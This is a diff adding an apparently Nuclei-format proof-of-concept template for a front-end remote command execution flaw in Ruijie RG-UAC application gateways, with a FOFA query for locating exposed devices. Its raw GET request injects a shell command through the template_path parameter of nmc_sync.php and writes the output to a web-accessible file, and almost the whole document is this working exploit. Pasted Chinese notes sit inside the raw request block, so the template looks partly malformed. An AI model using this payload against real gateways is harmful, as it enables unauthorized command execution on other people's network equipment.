@@ -1,0 +1,37 @@
+id: poc-rfa09fteokb4gowy
+info:
+  name: 锐捷RG-UAC应用网关前台RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rfa09fteokb4gowy'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rfa09fteokb4gowy
+    fofa: app="Ruijie-RG-UAC"
+http:
+- raw:
+  - 'GET /view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=|whoami%20>dudesuite.txt|cat HTTP/1.1
+
+
+    Accept-Encoding: gzip
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    OK
+
+
+    # 上传文件定位
+
+    /view/systemConfig/management/dudesuite.txt'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
